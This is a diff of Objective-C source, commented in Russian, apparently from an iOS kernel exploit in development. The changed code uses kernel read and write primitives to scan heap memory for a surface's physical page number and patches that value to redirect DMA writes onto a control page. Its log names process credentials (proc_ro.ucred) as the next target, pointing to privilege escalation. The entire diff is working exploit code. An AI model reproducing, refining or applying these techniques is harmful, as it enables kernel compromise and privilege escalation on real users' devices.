@@ -5739,18 +5739,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
               proven ? @"ПОДТВЕРЖДЁН" : @"НЕ СОШЛОСЬ — стоп (записей не будет)"]);
     if (!backingPA || !proven) { free(ctl); return r; }
 
-    // 3. поле подмены: heap-скан backingPA по ВСЕМ формам (1.9.110: сырой PA
-    //    не найден на 1.9.109 — значит PFN (PA>>14) или атрибутированная
-    //    форма). Считаем попадания по каждой форме — за прогон узнаем, как
-    //    ядро хранит физику поверхности.
+    // 3. поле подмены: heap-скан backingPA по формам (1.9.111: прогон 1.9.110
+    //    дал raw=0 pfn64=0 pfn32=2 attr=0 — ядро хранит backing как PFN32
+    //    (PA>>14, u32). Собираем адреса И половину qword'а (lo/hi) — вторая
+    //    половина может быть счётчиком страниц, её не трогаем).
     uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
     uint64_t totalPages = kconstant(physSize) >> 14;
     uint64_t hitVAs[8];
+    int hitHalf[8];
     int hitN = 0;
     uint32_t pfn32 = (uint32_t)(backingPA >> 14);
+    uint32_t ctlPFN = (uint32_t)(ctlPA >> 14);
+    int nRaw = 0, nPfn64 = 0, nAttr = 0;
     uint64_t pfn64 = backingPA >> 14;
     uint64_t attrPA = backingPA | 0x8000000000000000ULL;
-    int nRaw = 0, nPfn64 = 0, nPfn32 = 0, nAttr = 0;
     for (uint64_t pg = 0; pg < totalPages; pg++) {
         uint8_t ent[16];
         kreadbuf(tableVA + pg * 16, ent, 16);
@@ -5763,21 +5765,25 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         for (uint32_t o = 0; o + 8 <= sizeof(buf); o += 8) {
             uint64_t q = 0;
             memcpy(&q, buf + o, 8);
-            if (q == backingPA) {
-                nRaw++;
-                if (hitN < 8) {
-                    hitVAs[hitN++] = kva + o;
-                    kpNote(r, [NSString stringWithFormat:@"  ★ сырой backingPA @ %#llx (heap)", (unsigned long long)(kva + o)]);
-                }
-                continue;
-            }
+            if (q == backingPA) { nRaw++; continue; }
             if (q == pfn64) { nPfn64++; continue; }
             if (q == attrPA) { nAttr++; continue; }
-            if ((uint32_t)(q & 0xFFFFFFFF) == pfn32 || (uint32_t)(q >> 32) == pfn32) nPfn32++;
+            uint32_t lo = (uint32_t)q, hi = (uint32_t)(q >> 32);
+            if (lo == pfn32 && hitN < 8) {
+                hitVAs[hitN] = kva + o;
+                hitHalf[hitN] = 0;
+                kpNote(r, [NSString stringWithFormat:@"  ★ pfn32(lo32) @ %#llx (qword=%#018llx)", (unsigned long long)(kva + o), (unsigned long long)q]);
+                hitN++;
+            } else if (hi == pfn32 && hitN < 8) {
+                hitVAs[hitN] = kva + o;
+                hitHalf[hitN] = 1;
+                kpNote(r, [NSString stringWithFormat:@"  ★ pfn32(hi32) @ %#llx (qword=%#018llx)", (unsigned long long)(kva + o), (unsigned long long)q]);
+                hitN++;
+            }
         }
     }
-    kpNote(r, [NSString stringWithFormat:@"  формы backingPA %#llx в heap: raw=%d pfn64=%d pfn32=%d attr=%d",
-              (unsigned long long)backingPA, nRaw, nPfn64, nPfn32, nAttr]);
+    kpNote(r, [NSString stringWithFormat:@"  backingPA %#llx = PFN32 %#x; попаданий: pfn32-полей=%d (raw=%d pfn64=%d attr=%d)",
+              (unsigned long long)backingPA, pfn32, hitN, nRaw, nPfn64, nAttr]);
     if (!hitN) {
         kpNote(r, @"  backingPA не найден в heap — записей не будет");
         free(ctl);
@@ -5792,17 +5798,23 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     int confirmed = -1;
     for (int h = 0; h < hitN; h++) {
         uint64_t hv = hitVAs[h];
-        uint64_t origPA = 0;
-        kreadbuf(hv, &origPA, 8);
-        if (origPA != backingPA) {
-            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: уже не backing (%#llx) — пропуск", h, (unsigned long long)hv, (unsigned long long)origPA]);
+        int half = hitHalf[h];
+        uint64_t origQ = 0;
+        kreadbuf(hv, &origQ, 8);
+        uint32_t cur = half ? (uint32_t)(origQ >> 32) : (uint32_t)origQ;
+        if (cur != pfn32) {
+            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: половина уже не наш pfn (%#x) — пропуск", h, (unsigned long long)hv, cur]);
             continue;
         }
-        kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#llx → %#llx (контрольная)", h, (unsigned long long)origPA, (unsigned long long)ctlPA]);
-        kwritebuf(hv, &ctlPA, 8);
+        // пишем ТОЛЬКО совпавшую половину (вторая — вероятно счётчик страниц)
+        uint64_t newQ = half ? ((origQ & 0xFFFFFFFFULL) | ((uint64_t)ctlPFN << 32))
+                             : ((origQ & 0xFFFFFFFF00000000ULL) | ctlPFN);
+        kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#018llx → %#018llx (pfn %#x → %#x, %s32)",
+                  h, (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN, half ? "hi" : "lo"]);
+        kwritebuf(hv, &newQ, 8);
         uint64_t rb = 0;
         kreadbuf(hv, &rb, 8);
-        kpNote(r, [NSString stringWithFormat:@"  readback = %#llx %@", (unsigned long long)rb, rb == ctlPA ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
+        kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
         if (svc) {
             io_connect_t conn = 0;
             kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
@@ -5822,7 +5834,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint32_t px = *(volatile uint32_t *)(ctl + i);
             if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
         }
-        kwritebuf(hv, &origPA, 8);   // restore сразу — не оставляем коррупцию
+        kwritebuf(hv, &origQ, 8);   // restore сразу — не оставляем коррупцию
         if (changed) {
             confirmed = h;
             kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: hit #%d @ %#llx — контрольная страница изменена DMA (%u dword). Дальше цель = страница proc_ro.ucred ===",
